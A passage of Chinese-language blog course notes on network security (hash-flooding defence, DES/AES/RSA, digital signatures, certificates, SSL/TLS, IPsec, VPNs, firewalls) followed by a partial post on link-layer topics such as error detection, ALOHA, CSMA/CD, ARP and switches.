<p>防御哈希洪水攻击：</p>
<ul>
<li>使用带密钥哈希算法：如果攻击者不能掌握散列函数所有细节，就不能给出一组频繁碰撞的键，也就无法发动哈希洪水攻击。如果在散列函数中加入一个秘密参数，每建一张哈希表就随机生成一个新的秘密参数。这样一来，即使是同样的内容，放在不同的表里也会产生完全不同的内存分配。这整个过程攻击者完全无法预测，即使发生碰撞，也是小概率的巧合，而不是黑客在主动控制，攻击也就不可能成立了。这个秘密参数称为哈希种子（Hash Seed），而这类使用哈希种子的哈希算法，我们称之为带密钥哈希算法（Keyed Hash Function）</li>
<li>换一种 hash 表的实现方式：JDK 8 使用了一种新的逻辑来构建 hash 表。当一个位置存储的元素个数小于8个时，仍然使用链表存储；当一个位置存储的元素个数大于等于8个时，改为使用平衡树来存储。这样就可以保证最差的插入时间是 O(nlogn) 了。为什么要设立“8个元素”这样一个限制呢？因为平衡树相比链表而言有着更高的开销，以及更散乱的内存布局（影响缓存命中率）。在正常情况下，哈希表的一个位置大约只会存储 1~4 个左右的元素，所以没有必要专门开一个平衡树来存储冲突的元素，对一些性能敏感的应用来说会造成显著的负面影响。</li>
</ul>
<h2 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h2><ul>
<li>明文：没有进过加密的数据</li>
<li>密文：进过加密算法加密的数据</li>
<li>加密、解密密钥：用于辅助加密、解密的参数</li>
</ul>
<p>按加密密钥与解密密钥是否相同，将加密算法分为两大类：<strong>对称加密</strong>（加解密钥相同）与<strong>非对称加密</strong>（每方有公开、私有两个密钥）</p>
<p>现代技术不是针对字母而是针对<strong>二进制位</strong>进行操作：</p>
<ul>
<li>对称加密<ul>
<li><p>流密码：密钥产生密钥流，由密钥流对数据流进行加解密。换言之，加密与解密使用的是同一个密钥<br><img src="https://i.loli.net/2020/02/07/HOK1XPzD7aq8Ckc.png" alt="流密码"></p>
</li>
<li><p>分组密码：将明文序列划分为若干长为 M 的明文组，各明文组利用长为 i 的密钥组变换得到若干长度为 N 的密文组。通常分组长度取 64 bits</p>
<p><img src="https://i.loli.net/2020/02/07/JOH4tvB5z1qgnU8.png" alt="Feistel分组密码"></p>
</li>
</ul>
</li>
<li>非对称加密：加密与解密需要两个不同的密钥</li>
</ul>
<h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><h4 id="分组密码例子：DES"><a href="#分组密码例子：DES" class="headerlink" title="分组密码例子：DES"></a>分组密码例子：DES</h4><p>DES：数据加密标准（Data Encryption Standand），本质是 16 轮的 Feistel 分组密码，分组长度为 64 bits，密钥长度为 56 bits，每轮产生一个 48 bits 的子密钥：</p>
<p><img src="https://i.loli.net/2020/02/07/KQu1WXrx9wV4Dfj.png" alt="DES加密"></p>
<p><img src="https://i.loli.net/2020/02/07/c9g7j84hTADVRG5.png" alt="子密钥生成"></p>
<p>IP 置换：把输入数据的<strong>排列顺序打乱</strong></p>
<h4 id="分组密码例子：AES"><a href="#分组密码例子：AES" class="headerlink" title="分组密码例子：AES"></a>分组密码例子：AES</h4><p>AES：高级加密标准（Advanced Encryption Standand），分组长度 128/192/256 bits，可提供 128/192/256 bits 密钥，循环次数在一定范围内可变，与 DES 相比安全得多。</p>
<h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>公钥加密算法的需求：</p>
<ul>
<li>公钥加密 K<sub>B</sub><sup>+</sup> 和私钥解密 K<sub>B</sub><sup>-</sup> 要满足：K<sub>B</sub><sup>-</sup>(K<sub>B</sub><sup>+</sup>(m)) = m</li>
<li>给定公钥 K<sub>B</sub><sup>+</sup>，不可能计算得到 K<sub>B</sub><sup>-</sup></li>
</ul>
<h4 id="非对称加密例子：RSA"><a href="#非对称加密例子：RSA" class="headerlink" title="非对称加密例子：RSA"></a>非对称加密例子：RSA</h4><p>任何信息在计算机中都以比特流的形式表示，每个比特流可以表示为一个唯一的整数，因此<strong>加密一个报文就等于加密一个整数</strong>。</p>
<p>RSA 公钥/私钥生成过程：</p>
<ol>
<li>选择 2 个大质数 p 和 q</li>
<li>计算 n = pq，z = (p-1)(q-1)</li>
<li>选择 e(e &lt; n)，使 e 与 z 互质</li>
<li>选择 d 使 ed mod z = 1</li>
<li>得到公钥 (n,e)，私钥（n,d）</li>
</ol>
<p>给定公钥 (n,e)和私钥(n,d)，RSA 加密过程：</p>
<ol>
<li>加密报文 m 时，计算 c = m<sup>e</sup> mod n</li>
<li>解密报文 c 时，计算 m = c<sup>d</sup> mod n</li>
</ol>
<p>总结：<strong>m = (m<sup>e</sup> mod n)<sup>d</sup> mod n = m<sup>ed</sup> mod n = m<sup>ed mod z</sup> mod n</strong></p>
<p>RSA 的公钥密钥是相对的，即可以用公钥加密私钥解密，也可以用私钥加密公钥解密：K<sub>B</sub><sup>-</sup>(K<sub>B</sub><sup>+</sup>(m)) = m = K<sub>B</sub><sup>+</sup>(K<sub>B</sub><sup>-</sup>(m))</p>
<p>由于 RSA 运算强度超高，实际应用中几乎不可能用于加密大报文，所以常常与对称加密结合使用。即用 RSA 解决对称加密中密钥分发问题，再利用对称加密算法对数据进行加密。这种方式分发的密钥称为<strong>会话密钥</strong>。</p>
<h2 id="报文完整性"><a href="#报文完整性" class="headerlink" title="报文完整性"></a>报文完整性</h2><p>报文完整性也称为报文认证，目标有：</p>
<ul>
<li>证明报文确实来自<strong>声称的发送方</strong></li>
<li>验证报文<strong>没有被篡改</strong></li>
<li>预防报文的<strong>时间、顺讯、持有期被修改</strong></li>
</ul>
<p>对报文应用散列函数 H 得到一个<strong>固定长度</strong>的散列码。这个散列码称为<strong>报文摘要</strong>，相当于源报文的数字指纹，可以用于报文认证。</p>
<p><strong>常见的散列函数算法：</strong></p>
<ul>
<li>MD5：对任意长度的报文输入，计算输出 128 bits 散列值</li>
<li>SHA-1（Secure Hash Algorithm）：要求输入长度 &lt; 2<sup>64</sup>，计算输出 160 bits 散列值。速度较慢但是安全性高于 MD5</li>
</ul>
<p><img src="https://i.loli.net/2020/02/08/5nhQBRmlwc8ApJY.png" alt="报文认证"></p>
<p>这种报文认证方法虽然能验证报文完整性，但是无法解决否认（发送方不承认自己发送过某一报文）、伪造（接收方伪造一份报文并声称来自发送方）、篡改（接收方对收到的信息进行修改）等问题，由此衍生了现实中广泛使用的数字签名（Digital Signatures）技术</p>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名是实现安全电子交易的核心技术之一，特点是：</p>
<ul>
<li>可验证性：可以验证发送方身份、报文是否被篡改</li>
<li>不可伪造性：接收方无法伪造报文</li>
<li>不可抵赖性：发送方无法否认曾经发送过这样一个报文</li>
</ul>
<p>要实现数字签名，必须依赖于加密技术。但是为了确保接收方不可能伪造报文，无法使用对称加密技术。</p>
<p>签名过程举例：Bob 作为发送方给 Alice 发消息</p>
<p><img src="https://i.loli.net/2020/02/08/piZw95RkYKrS8a4.png" alt="签名报文摘要"></p>
<p>经过加密的报文摘要称为<strong>报文认证码（MAC）</strong>，是基于密钥和消息摘要所获得的一个值，可用于数据源认证和完整性校验。</p>
<h2 id="密钥分发中心（KDC）"><a href="#密钥分发中心（KDC）" class="headerlink" title="密钥分发中心（KDC）"></a>密钥分发中心（KDC）</h2><p>解决两个实体在网上共享对称密钥的问题，由此引入“可信任的密钥分发中心（Key Distribution Center）”作为两实体间的中介。</p>
<p>KDC 本质上是一个服务器，每个使用共享密钥服务的用户都要在此注册一个专属密钥。</p>
<p>密钥分发举例：Alice 与 Bob 使用 KDC 为中介共享密钥，R 即是 Alice 与 Bob 间的会话密钥</p>
<p><img src="https://i.loli.net/2020/02/08/nlT748VJQMcCpHW.png" alt="密钥分发"></p>
<h2 id="认证中心（CA）"><a href="#认证中心（CA）" class="headerlink" title="认证中心（CA）"></a>认证中心（CA）</h2><p>CA 负责公钥分发（保证公钥的来源可信），实现特定实体与其公钥的绑定：</p>
<p>假设 Bob 在 CA 注册他的公钥信息：</p>
<ol>
<li>Bob 向 CA 提供身份证明</li>
<li>CA 创建绑定 Bob 身份及其公钥的证书</li>
<li>证书包含 CA 签名的 Bob 的公钥</li>
</ol>
<p><img src="https://i.loli.net/2020/02/08/uBWcYDPXKn4Mepv.png" alt="CA认证"></p>
<p>Alice 想要得到 Bob 的公钥：</p>
<ol>
<li>获得 Bob 的公钥证书</li>
<li>应用 CA 的公钥解密，获得 Bob 的公钥</li>
</ol>
<p><img src="https://i.loli.net/2020/02/08/SDnVh2NzTKMeAu5.png" alt="CA解密"></p>
<p>一张公钥证书包含的要素有：</p>
<ul>
<li>序列号：唯一发行号</li>
<li>持有人信息：机构名，机构公钥，签名算法</li>
<li>发行者信息</li>
<li>有效期：保证在这个时间内从 CA  获得的公钥是有效的</li>
<li>发行者数字签名</li>
</ul>
<p><img src="https://i.loli.net/2020/02/09/Zv6k1a8u2Oc3SCI.png" alt="公钥证书"></p>
<h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><p>安全套接字层（SSL）或传输层安全（TLS） 可作为基础协议栈的组成部分，对应用透明。使用 SSL 后，传送 的应用层数据会被加密：</p>
<p><img src="https://i.loli.net/2020/02/09/PpZgjnTwkQEJ5RN.png" alt="SSL/TLS"></p>
<p>所谓 HTTPS 就是套了一层 SSL 的 HTTP 协议，保证信息的机密性和完整性，提供服务器认证功能。</p>
<h3 id="SSL-通信概览"><a href="#SSL-通信概览" class="headerlink" title="SSL 通信概览"></a>SSL 通信概览</h3><p>以 Alice 向 Bob 建立一个 SSL 连接为例：</p>
<p>TCP 连接建立完成后，就要开始<strong>建立 SSL 连接</strong></p>
<ol>
<li>Alice 向 Bob 发送请求</li>
<li>Bob 回应他的公钥证书</li>
<li>Alice 获得 Bob 的公钥，利用这个公钥加密一个随机产生的主密钥 MS 表示为 EMS（加密过的主密钥）</li>
</ol>
<p>不同的加密操作使用不同的密钥会更安全（如：报文认证码 MAC 密钥与数据加密密钥），所以 SSL 会通过主密钥 MS <strong>派生出一组密钥</strong>：</p>
<ul>
<li>K<sub>c</sub>：加密客户端向服务器发送数据的密钥</li>
<li>M<sub>c</sub>：加密客户端向服务器发送数据的 MAC 密钥</li>
<li>K<sub>s</sub>：加密服务器向客户端发送数据的密钥</li>
<li>M<sub>s</sub>：加密服务器向客户端发送数据的 MAC 密钥</li>
</ul>
<p>SSL 将字节流<strong>分割</strong>为一系列记录，每个记录携带自己的 MAC。在 MAC 中有记录的<strong>序列号</strong>和<strong>一次性随机数</strong>，防止攻击者重排或重放记录。同时还要添加<strong>记录类型</strong>，防止攻击者伪造 TCP 断连，type=0 用于数据记录，type=1 用于断连。即：MAC = MAC(key, sequence||type||digest)</p>
<p><img src="https://i.loli.net/2020/02/09/Wp6jCXhdVsRDKr3.png" alt="SSL记录"></p>
<p>一次简化的 SSL 通信过程如下：</p>
<p><img src="https://i.loli.net/2020/02/09/UrEF6ADhgWdI8qj.png" alt="SSL通信过程"></p>
<h3 id="现实中的-SSL-协议栈"><a href="#现实中的-SSL-协议栈" class="headerlink" title="现实中的 SSL 协议栈"></a>现实中的 SSL 协议栈</h3><p>SSL 支持客户与服务器商定各自使用的<strong>密码组</strong>（加密算法及密钥），通常是客户端提供选项，服务器从中挑选。</p>
<p>SSL 不是一个单独的协议，而是两层共四个协议：</p>
<p><img src="https://i.loli.net/2020/02/10/3e8GhFqg5BADw1s.png" alt="SSL四协议"></p>
<ul>
<li>更改密码规格协议：负责更改当前连接的密码组，标志着当前加密策略的改变。ContentType = 20</li>
<li>警告协议：加密出错或握手失败时，为对方发送警告或直接中止当前连接。ContentType = 21</li>
<li>握手协议：确定 SSL 握手过程（商定加密算法，建立密钥，提供服务器证书认证）。ContentType = 22</li>
<li>记录协议：描述 SSL 记录格式，封装数据</li>
</ul>
<p><img src="https://i.loli.net/2020/02/10/slABwdEjWJz3MhL.png" alt="SSL记录"></p>
<h3 id="SSL-握手过程"><a href="#SSL-握手过程" class="headerlink" title="SSL 握手过程"></a>SSL 握手过程</h3><ol>
<li>客户端发送其支持的算法列表及客户端一次性随机数（nonce）</li>
<li>服务器选择算法并发回给客户：选择 + 证书 + 服务器一次性随机数</li>
<li>客户端验证证书提取服务器公钥，生成<strong>预主密钥</strong>，并利用服务器公钥加密预主密钥，发送给服务器</li>
<li>客户端与服务器基于预主密钥和一次性随机数分别独立计算加密密钥和 MAC 密钥（两方使用相同的算法，得到相同的密钥）</li>
<li>客户端发送一个针对所有握手过程的 MAC</li>
<li>服务器发送一个针对所有握手过程的 MAC</li>
</ol>
<p>SSL 完全建立之前所有信息都是明文传输的，这就很容易被有心人篡改其中内容，最后两步可以作为握手信息完整性认证。</p>
<h2 id="IPsec"><a href="#IPsec" class="headerlink" title="IPsec"></a>IPsec</h2><p>IPsec 负责网络层安全，提供机密性，完整性，源认证，防重放攻击服务。IPsec 在网络层中的传输有两种模式：</p>
<ul>
<li>传输模式：IPsec 数据报的发送与接收都在端系统完成<br><img src="https://i.loli.net/2020/02/10/KcMzgYaHW9FmZnf.png" alt="IPsec传输模式"></li>
<li>隧道模式：边缘路由器是 IPsec 感知的，IPsec 数据报进入局域网前还原为普通 IP 数据报<br><img src="https://i.loli.net/2020/02/10/tKvBjaneT8SxqPi.png" alt="IPsec隧道模式"></li>
</ul>
<p>有两个协议提供 IPsec 服务：</p>
<ul>
<li>数据认证头协议（AH, Authentication Header）：提供源认证，完整性<ul>
<li>传输模式：<br><img src="https://i.loli.net/2020/02/11/YHNn6CbAxr58pGM.png" alt="传输模式AH记录"><br>下一个头：指向源 IP 数据报载荷中的头部信息，如 TCP 头、UDP 头</li>
<li>隧道模式：<br><img src="https://i.loli.net/2020/02/11/vjBYzwEKF8de9N2.png" alt="隧道模式AH记录"></li>
</ul>
</li>
<li>封装安全协议（ESP, Encapsulation Security Protocol）：提供源认证，完整性，机密性。实际应用中最为广泛，我们常用的 VPN 就是基于这种协议<ul>
<li>传输模式：<br><img src="https://i.loli.net/2020/02/11/AleEbu4oYGrnH6v.png" alt="传输模式ESP记录"></li>
<li>隧道模式：最重要最常见的 IPsec 实现<br><img src="https://i.loli.net/2020/02/11/HKMmj89w2WpdXG1.png" alt="隧道模式ESP记录"></li>
</ul>
</li>
</ul>
<h3 id="安全关联"><a href="#安全关联" class="headerlink" title="安全关联"></a>安全关联</h3><p>发送数据前，发送端到接收端之间需要建立安全关联 <strong>SA</strong>(Security Association)以定义对数据报的加密算法与密钥。两方均要维护 SA 的连接状态信息。换言之，IPsec 并不是简单的对 IP 的封装，IP 是无连接的，<strong>IPsec 是面向连接的</strong>：</p>
<p><img src="https://i.loli.net/2020/02/10/3IexuNEcTjdCKpv.png" alt="SA连接"></p>
<h3 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h3><p>安全策略 <strong>SP(Security Policy)</strong> 定义了对什么样的数据流应用 IPsec。多条安全策略记录组成了安全策略数据库 SPD。服务器提取数据报关键信息填充到一个称为“选择符”（目标IP，源IP，传输层协议，源端口，目标端口）的结构中，利用选择符去搜索 SPD，检索匹配的 SP。</p>
<h2 id="虚拟专用网（VPN）"><a href="#虚拟专用网（VPN）" class="headerlink" title="虚拟专用网（VPN）"></a>虚拟专用网（VPN）</h2><p>专用网络：基于专属的网络设备、链路或协议建设的专门用途的网络。最大的好处就是安全，但是成本很高。</p>
<p><img src="https://i.loli.net/2020/02/10/SRnjU6oa45tBFWC.png" alt="专用网络"></p>
<p>虚拟专用网络：通过建立在公共网络上的<strong>安全隧道</strong>，实现总部与分部的安全连接，在逻辑上建立一个专用网络，大大降低了费用。由隧道模式 ESP 实现的 IPsec 是 VPN 最常见的实现方法。</p>
<p><img src="https://i.loli.net/2020/02/10/Ay3ohPu6sZIarG2.png" alt="虚拟专用网络"></p>
<p>隧道：通过 Internet 提供安全的端到端的数据传输，本质上是一种加密与封装。数据进入隧道时经 VPN 封装在 Internet 中传输。</p>
<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p><img src="https://i.loli.net/2020/02/11/cPOTpuCNy6EUd4F.png" alt="VPN实例"></p>
<ol>
<li>R1 将 IP 数据报转换为 IPsec 数据报<ul>
<li>检索 SPD，确定 SP</li>
<li>检索 SAD，确定 SA</li>
<li>在源 IP 数据报后面附加 ESP 尾部</li>
<li>利用 SA 的加密算法与密钥加密数据报</li>
<li>在加密结果前面附加 ESP 头</li>
<li>利用 SA 的加密算法与密钥创建报文认证码 MAC</li>
<li>构造新 IP 头，发到 R2 去</li>
</ul>
</li>
<li>R2 解封 IPsec 数据报<ul>
<li>提取 SPI 去检索 SAD，确定 SA</li>
<li>利用共享密钥解出原始 IP 数据报</li>
</ul>
</li>
</ol>
<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>防火墙是隔离内网与公共互联网，阻止某些分组进入 or 离开内网的软硬件设施。可分为三类：</p>
<ul>
<li>无状态分组过滤：位于网络边缘路由器，根据 IP 地址、端口号、协议类型等信息逐个过滤分组决定是否转发。</li>
<li>有状态组过滤：跟踪每个 TCP 连接，根据 SYN、FIN 等状态决定是否放行分组。</li>
<li>应用网关：基于应用层数据过滤分组</li>
</ul>
<p><img src="https://i.loli.net/2020/02/11/i87WYut32LzXHVG.png" alt="应用网关"></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之链路层</title>
    <url>/2020/01/30/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    <content><![CDATA[<p>先明确几个术语：</p>
<ul>
<li>结点（node）：主机和路由器</li>
<li>链路（link）：相邻结点的连接通道</li>
<li>帧（frame）：链路层数据分组</li>
</ul>
<p>链路层负责通过一条链路在相邻结点之间传送数据报，提供的服务有：</p>
<ul>
<li>组帧：封装数据报构成数据帧，加首部和尾部，帧同步（将物理层比特流转换为帧）</li>
<li>链路接入：如果链路是共享的，需要解决<code>链路接入</code>问题。帧首部 MAC 地址用于标识帧的源和目的地</li>
<li>相邻结点间的可靠交付（不一定实现）</li>
<li>流量控制：协调相邻的发送和接收结点</li>
<li>差错检测与纠正：应对信号衰减和噪声</li>
</ul>
<h2 id="差错编码"><a href="#差错编码" class="headerlink" title="差错编码"></a>差错编码</h2><p>D -&gt; DR，R 为差错检测与纠正比特（冗余比特）：</p>
<p><img src="https://i.loli.net/2020/01/31/OQePn1hbz65NMXG.png" alt="线性分组码"></p>
<p><strong>差错编码不保证 100% 可靠</strong>，分为<strong>检错码</strong>与<strong>纠错码</strong>。</p>
<h3 id="检错"><a href="#检错" class="headerlink" title="检错"></a>检错</h3><p>设 C<sub>i</sub>、C<sub>j</sub> 为编码集中任意两个码字，C’ 为错出错码字：</p>
<p>对于检错码，如果编码集的汉明距离 d = r + 1，则该差错编码可以检测 r 位差错</p>
<p><img src="https://i.loli.net/2020/02/02/Z2LgfdqeOl64Nku.png" alt="检错码"></p>
<p>对于纠错码，若编码集的汉明距离 D = 2r + 1，则该差错编码可以纠错 r 位差错</p>
<p><img src="https://i.loli.net/2020/02/02/wfSurjoh4TsUFCg.png" alt="纠错码"></p>
<h4 id="奇偶校验"><a href="#奇偶校验" class="headerlink" title="奇偶校验"></a>奇偶校验</h4><p>给一串比特增加一个校验位，使得该串中所有 “1” 的个数之和为奇数称奇校验，为偶数称偶校验。</p>
<p><img src="https://i.loli.net/2020/02/02/Sb13soanWqRtAyV.png" alt="奇校验"></p>
<p><img src="https://i.loli.net/2020/02/02/gz5fEopJ2X7Zjw4.png" alt="偶校验"></p>
<p>数据和校验位发送给接受方后，接收方再次对数据中1的个数进行计算，如果为奇数则校验通过，表示此次传输过程未发生错误。如果不是奇数，则表示有错误发生，此时接收方可以向发送方发送请求，要求重新发送一遍数据。</p>
<p>优点：</p>
<ul>
<li>容易实现</li>
</ul>
<p>缺点：</p>
<ul>
<li>奇偶校验的检错率只有50%，因为只有奇数个数据位发生变化能检测到，如果偶数个数据位发生变化则无能为力了</li>
<li>每传输一个字节都需要加一位校验位，对传输效率影响很大</li>
<li>奇偶校验只能发现错误，但不能纠正错误，也就是说它只能告诉你出错了，但不能告诉你怎么出错了，一旦发现错误，只好重发</li>
</ul>
<h4 id="校验和"><a href="#校验和" class="headerlink" title="校验和"></a>校验和</h4><p>发送端：</p>
<ol>
<li>将数据按 16 bits 一组划分为的二进制数序列（此时数据中校验和字段为 0）</li>
<li>求和（Sum）：对这些二进制数求和（最高进位的 “1” 返回最低位继续相加）</li>
<li>校验和（CheckSum）：Sum 的反码</li>
</ol>
<p>接收端：</p>
<ol>
<li>重新计算数据的 CheckSum’（此时数据中校验和字段不为 0）</li>
<li>16 位 CheckSum’ 全为 0，无错</li>
</ol>
<h2 id="MAC-协议"><a href="#MAC-协议" class="headerlink" title="MAC 协议"></a>MAC 协议</h2><p>功能：多结点共享传输信道过程中，避免信号互相干扰。</p>
<p>有三类 MAC 协议：</p>
<ul>
<li>信道划分 MAC 协议：利用多路复用（时分、频分）支持多结点，每个结点只使用自己那部分</li>
<li>随机访问 MAC 协议：信道不划分，允许冲突。采用“冲突恢复”机制</li>
<li>轮转 MAX 协议：结点轮流使用信道，使用时占用全部带宽</li>
</ul>
<h3 id="随机访问-MAC-协议"><a href="#随机访问-MAC-协议" class="headerlink" title="随机访问 MAC 协议"></a>随机访问 MAC 协议</h3><p>结点发送分组时：</p>
<ul>
<li>利用信道全部带宽 R 发送分组</li>
<li>没有事先的结点间协调</li>
</ul>
<p>当两个或多个结点同时传输，会发生“<strong>冲突</strong>”。</p>
<h4 id="典型：时隙-ALOHA-协议"><a href="#典型：时隙-ALOHA-协议" class="headerlink" title="典型：时隙 ALOHA 协议"></a>典型：时隙 ALOHA 协议</h4><p>假定：</p>
<ul>
<li>所有帧大小相同</li>
<li>时间被划分为等长时隙（每个时隙刚好可以传输 1 个帧）</li>
<li>结点只在时隙开始时发送帧</li>
<li>结点能检测到冲突</li>
<li>所有结点的时钟同步</li>
</ul>
<p>运行：</p>
<ul>
<li>当结点有新帧，在下一时隙发送：<ul>
<li>无冲突：该结点可以在下一时隙继续发新帧</li>
<li>冲突：该结点在下一时隙以概率 <strong>P</strong> 重传帧</li>
</ul>
</li>
</ul>
<p>设 C 冲突时隙，E 空闲时隙，S 成功时隙：</p>
<p><img src="https://i.loli.net/2020/02/03/M2hT9UxicJ5mapt.png" alt="时隙ALOHA"></p>
<h4 id="典型：纯-ALOHA-协议"><a href="#典型：纯-ALOHA-协议" class="headerlink" title="典型：纯 ALOHA 协议"></a>典型：纯 ALOHA 协议</h4><p>不划分时隙的 ALOHA 协议，<strong>无需同步</strong>。</p>
<p>当有新的帧生成：</p>
<ul>
<li>立即发送</li>
<li>冲突可能性增大</li>
</ul>
<p>在 t<sub>0</sub> 时刻发送的帧，会与在 (t<sub>0</sub>-1, t<sub>0</sub>+1) 时间发送的帧冲突：<br><img src="https://i.loli.net/2020/02/03/HqX1ytmhi8RJxnD.png" alt="纯ALOHA"></p>
<h4 id="典型：CSMA-协议"><a href="#典型：CSMA-协议" class="headerlink" title="典型：CSMA 协议"></a>典型：CSMA 协议</h4><p>ALOHA 协议经常做些损人不利己的事，不考虑其它结点的感受去占用信道。<strong>载波监听多路访问协议 CSMA</strong>(carrier sense multiple access) 与之相比最大的改进在于<strong>发送帧之前，先监听信道（载波）</strong>：</p>
<ul>
<li>信道空闲：发送完整帧</li>
<li>信道忙：推迟发送<ul>
<li>1-坚持 CSMA：以概率 P=1 <strong>一直监听</strong>信道，一旦信道空闲立刻发送这个帧</li>
<li>非坚持 CSMA：<strong>随机监听</strong>信道</li>
<li>P-坚持 CSMA以 概率 P 坚持监听信道，以 概率 1-p 随机监听信道</li>
</ul>
</li>
</ul>
<p>由于信号在信道上的传输延迟，冲突仍然可能发生：</p>
<p><img src="https://i.loli.net/2020/02/03/hZRAYIUpXG9q6c3.png" alt="CSDM冲突"></p>
<h4 id="典型：CSMA-CD-协议"><a href="#典型：CSMA-CD-协议" class="headerlink" title="典型：CSMA/CD 协议"></a>典型：CSMA/CD 协议</h4><p>CSMA/CD 协议是带有冲突检测的 CSMA 协议：</p>
<ul>
<li>短时间内可以检测到冲突</li>
<li>冲突后传输中止，减少信道浪费</li>
</ul>
<p><img src="https://i.loli.net/2020/02/03/OiRWNLvsruQg4a5.png" alt="CSDM/CD冲突检测"></p>
<p>最大特点：<strong>边发边听，不发不听！</strong></p>
<p>设网络带宽 R(bps)，数据帧最小长度 L<sub>min</min>(bits)，信号传播速度 V(m/s)：</p>
<p><img src="https://i.loli.net/2020/02/03/1q5hVjXolUWLFsA.png" alt="最小发送时间"></p>
<p>A 如果要检测到 B 的冲突，必须保证 L<sub>min</sub>/R &gt;= 2d<sub>max</sub>/V，如果算上路由器等耗时则是 <strong>L<sub>min</sub>/R &gt;= RTT</strong>。</p>
<h3 id="信道划分与随机访问对比"><a href="#信道划分与随机访问对比" class="headerlink" title="信道划分与随机访问对比"></a>信道划分与随机访问对比</h3><p>信道划分 MAC 协议：</p>
<ul>
<li>网络负载重时，共享信道<strong>效率高</strong>且<strong>公平</strong></li>
<li>网络负载轻时，共享信道<strong>效率低</strong></li>
</ul>
<p>随机访问 MAC 协议：</p>
<ul>
<li>网络负载轻时，共享信道<strong>效率高</strong>，单个结点可以利用全部带宽</li>
<li>网络负载重时，产生冲突开销</li>
</ul>
<h2 id="ARP-与-MAC"><a href="#ARP-与-MAC" class="headerlink" title="ARP 与 MAC"></a>ARP 与 MAC</h2><p>MAC 地址共 48bits，用 16 进制形式表示。用于标识局域网内一个帧从哪个接口发出，到达哪个物理相连的其他接口。每块网卡都有自己独有的 MAC 地址，如：1A-2F-BB-76-09-AD</p>
<h2 id="ARP-协议"><a href="#ARP-协议" class="headerlink" title="ARP 协议"></a>ARP 协议</h2><p>地址解析协议（ARP, Address Resolve Protocal）负责网络层地址与链路层地址的转换。</p>
<p>ARP 表：LAN 中每个 IP 结点维护一个表，存储某些 LAN 结点的 [IP, MAC, TTL] 映射关系</p>
<p>下面是一个 ARP 表示例（本地网卡 IP 地址 192.168.100.107，子网掩码 255.255.255.0，默认网关 192.168.100.11）：</p>
<p><img src="https://i.loli.net/2020/05/17/d6eJ9OhzwVrcHxk.png" alt="ARP表"></p>
<p>例1：A 想要给<strong>同一局域网内</strong>的 B 发送数据报（B 的MAC 地址不在 A 的 ARP 表中）：</p>
<ol>
<li>A <strong>广播</strong> ARP 查询分组，其中包含 B 的 IP 地址</li>
<li>B 接收 ARP 查询分组，IP 地址匹配成功，向 A 应答 B 的 MAC 地址</li>
<li>A 在自己的 ARP 表中缓存 B 的 IP-MAC 映射直至超时（超时后再次刷新）</li>
</ol>
<p><img src="https://i.loli.net/2021/03/10/a8ercKtqWwEDu7p.png" alt="同一子网ARP.png"></p>
<p>例2：A 想要给<strong>不同局域网内</strong>的 B 发送数据报（B 的MAC 地址不在 A 的 ARP 表中，A 知道第一跳路由器接口的 MAC 地址）：</p>
<p><img src="https://i.loli.net/2020/02/03/6ISrl85JXjqokQC.png" alt="LAN间ARP"></p>
<ol>
<li>A 构造 IP 数据报，源 IP 地址为 A 的，目的 IP 地址为 B 的</li>
<li>A 构造链路层帧，源 MAC 地址为 A 的，目的 MAC 地址为第一跳路由器的</li>
<li>R 接收帧，提取 IP 数据报传递给上层 IP 协议，利用转发表转发 IP 数据报</li>
<li>R 创建链路层帧，源 MAC 地址为 R 出口的，目的 MAC 地址为 B 的</li>
</ol>
<p><strong>数据帧传递过程中源/目的 MAC 地址不断改变！</strong></p>
<p><img src="https://i.loli.net/2021/03/10/7QwzHUBKx8osWyj.png" alt="不同子网ARP.png"></p>
<h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p>交换机是典型的<strong>链路层设备</strong>，交换可以在多个主机间<strong>同时</strong>进行。特点有：</p>
<ul>
<li>存储、转发以太网帧</li>
<li>检验到达帧的 MAC 地址，选择性向一个或多个输出链路转发</li>
<li>利用 CSMA/CD 协议访问链路</li>
</ul>
<p><img src="https://i.loli.net/2020/02/03/TIbQX3Sf5Uc9nvB.png" alt="交换机"></p>
<p>每个交换机维护一张<strong>交换表</strong>，每个表项存放（主机 MAC 地址，到达主机的接口，时间戳）。</p>
<p>交换机通过<strong>自学习</strong>，获知到达主机的接口信息。当一个帧到达交换机时：</p>
<ol>
<li>收帧，交换机提取到帧的源 MAC 地址，将源主机的 MAC 地址与接口信息记录到交换表中</li>
<li>利用目的 MAC 地址检索交换表<ul>
<li>检索成功：如果目的主机与源主机处于同一网段（有相同的交换机接口）则丢弃帧；否则将帧转发到相应接口</li>
<li>检索失败：洪泛（向除了接收接口之外所有接口转发）</li>
</ul>
</li>
</ol>
<p><img src="https://i.loli.net/2020/02/03/gPpzCavur2m91bk.png" alt="组织机构网络"></p>
<h3 id="交换机-vs-路由器"><a href="#交换机-vs-路由器" class="headerlink" title="交换机 vs 路由器"></a>交换机 vs 路由器</h3><p>两者均为存储、转发设备：</p>
<ul>
<li>路由器：网络层设备（检测网络层分组首部）</li>
<li>交换机：链路层设备（检测链路层帧首部）</li>
</ul>
<p>两者均使用转发表：</p>
<ul>
<li>路由器：利用路由算法</li>
<li>交换机：利用自学习</li>
</ul>
<h2 id="虚拟局域网（VLAN）"><a href="#虚拟局域网（VLAN）" class="headerlink" title="虚拟局域网（VLAN）"></a>虚拟局域网（VLAN）</h2><p>通过对交换机接口或 MAC 地址进行分组，在一个物理局域网上配置多个虚拟局域网。这样就避免了广播报文（DHCP、ARP 等）在不必要的机器组中传播（<strong>流量隔离</strong>）：</p>
